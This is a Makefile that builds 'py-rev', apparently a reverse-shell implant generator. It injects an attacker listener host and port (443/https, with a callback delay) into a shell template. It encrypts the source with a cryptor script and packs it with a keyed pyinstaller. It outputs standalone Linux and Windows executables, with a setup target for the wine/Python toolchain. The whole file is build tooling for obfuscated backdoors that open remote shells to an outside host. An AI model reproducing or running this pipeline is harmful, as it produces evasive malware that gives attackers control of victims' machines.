# Run 'make setup' first!
util = ../../
################################################
# Do not wrap in quotes
LHOST=$(shell $(util)customize_shell.py --no-prompt --get-opt LHOST)
LPORT=443
PROTO=https
DELAY=30
# Not used:
LINUX-SHELL=/bin/bash
WINDOWS-SHELL=cmd.exe
################################################

wine-py = /root/.wine/drive_c/Python34/
windows-cc = wine $(wine-py)/Scripts/pyinstaller.exe
linux-cc = pyinstaller

# NAMES
release = release/
linux-release = $(release)linux/
windows-release = $(release)windows/
src-dir = src/
rev = py-rev

# TARGETS

linux-src = $(src-dir)$(rev).linux.py
windows-src = $(src-dir)$(rev).windows.py

linux-crypt = $(src-dir)$(rev).linux.crypt.py
windows-crypt = $(src-dir)$(rev).windows.crypt.py

template = $(rev).template.py

# COMPUTED
obf-key=$(head -c 1000 /dev/urandom | md5sum | head -c 16)
customize-prefix = $(util)customize_shell.py --no-warnings --PROTO $(PROTO) --LHOST $(LHOST) --LPORT $(LPORT) --custom --DELAY 30

.PHONY: all setup clean

all: linux windows

linux: $(linux-release)$(rev)
windows: $(windows-release)$(rev).exe

$(linux-release)$(rev): $(linux-crypt)
	$(linux-cc) --onefile --key=$(obf-key) $(linux-crypt)
	staticx dist/* $(linux-release)$(rev)
	rm -rf __pycache__
	rm -rf dist
	rm -rf build
	rm -f *.spec

$(windows-release)$(rev).exe: $(windows-crypt)
	$(windows-cc) --onefile --key=$(obf-key) $(windows-crypt)
	mv dist/* $(windows-release)$(rev).exe
	rm -rf __pycache__
	rm -rf dist
	rm -rf build
	rm -f *.spec

$(linux-crypt): $(linux-src)
	cat $(linux-src) | $(util)cryptor.py | tee $(linux-crypt)

$(windows-crypt): $(windows-src)
	cat $(windows-src) | $(util)cryptor.py | tee $(windows-crypt)
    
$(linux-src):   $(template)
	$(customize-prefix) --SHELL $(LINUX-SHELL) $(template) | tee $(linux-src).tmp
	cmp --silent $(linux-src).tmp $(linux-src) || cp $(linux-src).tmp $(linux-src)
	rm $(linux-src).tmp
	
$(windows-src):   $(template) $(obf-key-file)
	$(customize-prefix) --SHELL $(WINDOWS-SHELL) $(template) | tee $(windows-src).tmp
	cmp --silent $(windows-src).tmp $(windows-src) || cp $(windows-src).tmp $(windows-src)
	rm $(windows-src).tmp

clean:
	rm -f $(linux-release)*
	rm -f $(windows-release)*
	rm -f $(src-dir)*
	rm -rf __pycache__
	rm -rf dist
	rm -rf build
	rm -f *.spec
	rm -f log.txt
	rm -f *.msi
    
setup: _setup clean

# WARNING: If your payload needs additional packages, you
# need to install them before pyinstaller will bundle them
# (be careful, this will increase binary size)
_setup:
	apt update; apt install python3 python3-pip wine upx patchelf -y
	pip3 install pyinstaller staticx pycrypto requests
	@if [ ! -d "$(wine-py)" ]; then \
		wget https://www.python.org/ftp/python/3.4.4/python-3.4.4.amd64.msi ; \
		wine msiexec /i python-3.4.4.amd64.msi /L*v log.txt ; \
		pushd ~/.wine/drive_c/Python34/ ; \
		wine python.exe Scripts/pip.exe install pyinstaller ; \
		wine python.exe Scripts/pip.exe install requests ; \
		wget 'https://github.com/axper/python3-pycrypto-windows-installer/raw/master/pycrypto-2.6.1.win-amd64-py3.4.exe'; \
		wine pycrypto-2.6.1.win-amd64-py3.4.exe ; \
		popd ; \
	fi
	mkdir -p $(linux-release)
	mkdir -p $(windows-release)
	mkdir -p $(src-dir)

